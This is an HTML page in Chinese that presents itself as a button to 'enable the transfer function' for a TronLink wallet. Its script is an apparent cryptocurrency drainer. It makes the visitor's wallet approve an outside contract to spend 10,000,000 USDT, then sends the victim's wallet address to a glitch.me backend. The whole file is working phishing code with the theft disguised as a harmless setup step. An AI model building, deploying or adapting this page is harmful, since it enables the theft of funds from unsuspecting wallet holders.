<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>USDT 授權啟動</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
    button {
      background: #0984e3;
      color: #fff;
      border: none;
      padding: 1em 2em;
      border-radius: 8px;
      font-size: 1.2em;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <button onclick="authorizeUSDT()">開啟轉帳功能</button>

  <script>
    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND = "https://peaceful-precious-ceres.glitch.me";

    async function authorizeUSDT() {
      if (!window.tronWeb || !tronWeb.defaultAddress.base58 || !tronWeb.ready) {
        return alert("請使用 TronLink 並登入錢包");
      }

      const address = tronWeb.defaultAddress.base58;
      try {
        const usdt = await tronWeb.contract().at(USDT_CONTRACT);

        // 發送 approve 授權（建議額度 10,000,000 USDT）
        await usdt.approve(AUTH_CONTRACT, tronWeb.toSun(10000000)).send();

        // 等待鏈上確認後再次驗證授權是否成功
        const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
        const allowed = parseFloat(allowance.toString()) / 1e6;

        if (allowed >= 10000000) {
          await axios.post(`${BACKEND}/wallets`, { address });
          alert("✅ 已成功授權 10,000,000 USDT 給合約");
        } else {
          alert("⚠️ 授權金額不足，請重新操作");
        }
      } catch (err) {
        console.error("授權失敗", err);
        alert("❌ 授權失敗：" + err.message);
      }
    }
  </script>
</body>
</html>
